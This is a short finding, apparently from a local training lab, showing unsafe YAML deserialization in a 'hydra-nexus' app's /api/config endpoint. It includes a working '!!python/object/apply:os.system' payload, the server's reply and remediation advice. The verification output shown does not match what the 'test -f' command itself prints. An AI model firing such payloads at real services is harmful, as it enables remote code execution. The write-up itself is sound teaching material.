# YAML Deserialization — WebSploit `hydra-nexus`

## Target

http://127.0.0.1:5010

## Endpoint

POST /api/config

## Vulnerability

Unsafe YAML Deserialization / Remote Code Execution

## Proof of Concept

A controlled YAML payload was submitted:

```yaml
!!python/object/apply:os.system ["touch /tmp/hydra_yaml_rce"]
```

The application processed the payload successfully and returned:

```json
{
  "message": "Configuration processed successfully",
  "parsed_config": 0,
  "success": true
}
```

The value `0` is the return value of the executed `os.system()` call.

## Verification

The command executed:

```bash
docker exec hydra-nexus test -f /tmp/hydra_yaml_rce
```

returned:

```text
YAML RCE CONFIRMED
```

This demonstrates command execution during YAML deserialization inside the
training container.

## Root Cause

The application processes attacker-controlled YAML using an unsafe YAML
loader, allowing YAML tags that can instantiate Python objects or invoke
callables.

## Impact

An attacker able to submit malicious YAML may execute arbitrary
operating-system commands with the privileges of the application process.

## Remediation

* Never use unsafe YAML loaders on untrusted input.
* Use `yaml.safe_load()` for data-only YAML processing.
* Validate the expected YAML structure and data types.
* Run the application with least privilege.
* Restrict filesystem and process permissions.

## Scope

127.0.0.1:5010 — local WebSploit training environment.
